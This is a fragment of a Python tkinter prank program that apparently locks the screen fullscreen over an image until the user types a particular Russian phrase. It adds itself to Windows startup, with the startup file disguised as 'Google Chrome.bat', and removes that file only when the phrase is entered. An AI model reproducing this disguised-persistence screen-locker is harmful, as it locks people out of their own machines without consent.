...
image1 = Image.open("krasotka.png")
...
def clicked():
    res = format(txt.get())
    if res == 'самую красивую девушку во вселенной':
        file_path = '/tmp/file.txt'
        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
        os.remove(file_path)
        sys.exit()

add_to_startup(r"C:\Users\antares\Desktop\alatfar\main.pyw")
fullscreen()

txt_one = Label(window, text='Напиши, что ты видишь', font=("Arial Bold", fontsize), fg='white', bg='black')
...
txt.place(relx = .22, rely = .900, relwidth=.10, relheight=.03)
btn.place(relx = .32, rely = .900, relwidth=.10, relheight=.03)
